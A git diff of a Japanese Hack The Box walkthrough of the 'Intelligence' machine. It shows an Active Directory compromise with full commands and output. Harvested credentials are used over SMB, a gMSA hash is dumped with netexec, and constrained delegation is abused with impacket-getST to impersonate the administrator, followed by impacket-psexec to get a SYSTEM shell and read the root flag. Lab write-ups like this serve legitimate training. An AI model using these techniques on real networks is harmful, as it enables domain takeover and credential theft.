@@ -278,7 +278,7 @@ step2でitフォルダも読み取り可能であることを確認
 
                 3770367 blocks of size 4096. 1441638 blocks available
 
-└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/IT/downdetector.ps1                  
+└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/IT/downdetector.ps1
 Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
 smb://10.129.95.154/IT/downdetector.ps1 
 Downloaded 1.02kB in 7 seconds
@@ -456,17 +456,29 @@ TED.GRAVES::intelligence:3a4b4b0205562e23:6c5a2543d767342e8c900226a95407b5:01010
 
 
 ## STEP 4
-wow  
+bloodhoundの結果、ted.gravesが所属するグループはgmsa経由でsvc_int$のパスワードを確認できることが判明  
+また、svc_int$から委任経由でドメコンのマシンアカウントにアクセスできることも確認  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Intelligence_04.png">  
+svc_int$のntハッシュ取得
 ```sh
-└─$ netexec ldap 10.129.171.160 -u ted.graves -p Mr.Teddy --gmsa
-LDAP        10.129.171.160  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
-LDAPS       10.129.171.160  636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
-LDAPS       10.129.171.160  636    DC               [*] Getting GMSA Passwords
-LDAPS       10.129.171.160  636    DC               Account: svc_int$             NTLM: 5389896c2609ab8717b9d8f360f760ae     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
+└─$ netexec ldap 10.129.95.154 -u ted.graves -p Mr.Teddy --gmsa
+LDAP        10.129.95.154  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
+LDAPS       10.129.95.154  636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
+LDAPS       10.129.95.154  636    DC               [*] Getting GMSA Passwords
+LDAPS       10.129.95.154  636    DC               Account: svc_int$             NTLM: 5389896c2609ab8717b9d8f360f760ae     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
 ```
+WWW/dc.intelligence.htbに対する委任が有効であることを確認
 ```sh
-└─$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -ts -dc-ip 10.129.171.160 -hashes ':5389896c2609ab8717b9d8f360f760ae' 'intelligence.htb/svc_int$'    
+└─$ netexec ldap 10.129.95.154 -u 'svc_int$' -H 5389896c2609ab8717b9d8f360f760ae --find-delegation                        
+LDAP        10.129.95.154  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
+LDAP        10.129.95.154  389    DC               [+] intelligence.htb\svc_int$:5389896c2609ab8717b9d8f360f760ae 
+LDAP        10.129.95.154  389    DC               AccountName AccountType                         DelegationType                     DelegationRightsTo     
+LDAP        10.129.95.154  389    DC               ----------- ----------------------------------- ---------------------------------- -----------------------
+LDAP        10.129.95.154  389    DC               svc_int$    ms-DS-Group-Managed-Service-Account Constrained w/ Protocol Transition WWW/dc.intelligence.htb
+```
+WWW/dc.intelligence.htbをspnとするtgsを取得
+```sh
+└─$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -ts -dc-ip 10.129.95.154 -hashes ':5389896c2609ab8717b9d8f360f760ae' 'intelligence.htb/svc_int$'    
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [2025-11-25 18:24:59] [*] Getting TGT for user
@@ -474,25 +486,6 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [2025-11-25 18:25:02] [*] Requesting S4U2self
 [2025-11-25 18:25:03] [*] Requesting S4U2Proxy
 [2025-11-25 18:25:05] [*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-```
-```sh
-└─$ export KRB5CCNAME=administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-
-└─$ impacket-psexec -k -target-ip 10.129.171.160 'dc.intelligence.htb' 
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Requesting shares on 10.129.171.160.....
-[*] Found writable share ADMIN$
-[*] Uploading file dkONiIjk.exe
-[*] Opening SVCManager on 10.129.171.160.....
-[*] Creating service GuSs on 10.129.171.160.....
-[*] Starting service GuSs.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.1879]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32> type c:\users\administrator\desktop\root.txt
-b6e0354c00236a39e5b2f5cc5a462a75
 ```
 ```sh
 └─$ impacket-describeTicket administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache 
@@ -517,4 +510,26 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*]   Service Realm               : INTELLIGENCE.HTB
 [*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
 [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+```
+spnのサービスクラスが「www」のtgsを取得したため、通常は80番に対するアクセスが可能だと思うが実際は異なる  
+[リンク](https://www.thehacker.recipes/ad/movement/kerberos/relay#theory)で確認できるとおり、tgsは復号までしか確認されずspnのサービスクラスは確認されないらしい  
+ということでpsexec、ルートフラグゲット
+```sh
+└─$ export KRB5CCNAME=administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+
+└─$ impacket-psexec -k -target-ip 10.129.95.154 'dc.intelligence.htb' 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.95.154.....
+[*] Found writable share ADMIN$
+[*] Uploading file dkONiIjk.exe
+[*] Opening SVCManager on 10.129.95.154.....
+[*] Creating service GuSs on 10.129.95.154.....
+[*] Starting service GuSs.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> type c:\users\administrator\desktop\root.txt
+b6e0354c00236a39e5b2f5cc5a462a75
 ```
